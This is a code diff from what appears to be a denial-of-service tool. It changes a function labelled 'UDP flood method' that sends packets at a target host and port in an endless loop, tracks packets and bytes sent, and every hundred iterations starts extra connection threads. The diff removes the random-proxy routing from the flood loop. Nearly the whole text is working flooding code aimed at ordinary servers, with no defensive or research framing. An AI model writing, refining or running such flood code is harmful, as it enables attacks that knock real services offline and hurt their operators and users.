@@ -30,27 +30,23 @@ def build_ctx_request_http_package(_ctx: Context) -> bytes:
 def down_it_udp(_ctx: Context) -> None:
     """UDP flood method."""
     i = 1
-    proxy = None
-    target = (_ctx.host_ip, _ctx.port)
     while True:
-        proxy = _ctx.proxy_manager.get_random_proxy()
-        sock = _ctx.sock_manager.get_udp_socket(proxy)
+        sock = _ctx.sock_manager.get_udp_socket()
         request_packet = build_ctx_request_http_package(_ctx)
 
         try:
-            sent = sock.sendto(request_packet, target)
+            sent = sock.sendto(request_packet, (_ctx.host_ip, _ctx.port))
         except socket.gaierror:
             _ctx.add_error(Errors(ErrorCodes.CannotGetServerIP.value, GETTING_SERVER_IP_ERROR_MSG))
         except Exception as e:
             _ctx.add_error(Errors(ErrorCodes.UnhandledError.value, e))
-            _ctx.sock_manager.close_udp_socket(proxy)
+            _ctx.sock_manager.close_udp_socket()
         # successful try (sock.sendto)
         else:
             _ctx.Statistic.packets.total_sent += 1
             _ctx.Statistic.packets.sync_packets_sent()
             _ctx.Statistic.packets.total_sent_bytes += sent
             _ctx.remove_error(ErrorCodes.CannotGetServerIP.value)
-            proxy.report_success() if proxy is not None else 0
 
         i += 1
         if i == 100:
@@ -59,7 +55,7 @@ def down_it_udp(_ctx: Context) -> None:
                 threading.Thread(
                     daemon=True,
                     target=services.connect_host,
-                    args=[_ctx, proxy],
+                    args=[_ctx],
                 ).start()
                 # services.connect_host(_ctx,)
 
